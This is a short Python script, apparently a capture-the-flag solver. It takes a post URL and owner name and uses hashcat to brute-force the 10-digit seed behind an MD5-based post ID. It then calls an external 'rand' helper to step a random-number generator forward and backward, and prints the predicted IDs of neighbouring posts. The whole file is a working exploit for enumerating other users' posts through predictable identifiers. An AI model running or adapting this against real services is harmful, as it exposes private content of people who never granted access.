#!/usr/bin/env python3

import json
import sys
import requests
import subprocess
import hashlib

def subl(value):
	complete = subprocess.run(['rand', str(value)], stdout=subprocess.PIPE, universal_newlines=True)
	return map(int, complete.stdout.strip().split())

def next(value):
	n, _ = subl(value)
	return n

def prev(value):
	_, p = subl(value)
	return p

def main():
	data = json.loads(input())
	h = data['url'].split('/')[-1]
	complete = subprocess.run(['hashcat64', '--quiet', '-a', '3', '-m', '10', '-D', '1', '-i', '{}:@{}'.format(h, data['owner']), '?d' * 10], stdout=subprocess.PIPE, universal_newlines=True)
	state = int(complete.stdout.strip().split(':')[-1])
	nx = state
	pv = state
	for i in range(1, 10):
		nx = next(nx)
		id = hashlib.md5('{}@{}'.format(str(nx), data['owner']).encode()).hexdigest()
		print('/post/{}'.format(id))
	print()
	for i in range(1, 10):
		pv = prev(pv)
		id = hashlib.md5('{}@{}'.format(str(pv), data['owner']).encode()).hexdigest()
		print('/post/{}'.format(id))


if __name__ == '__main__':
	main()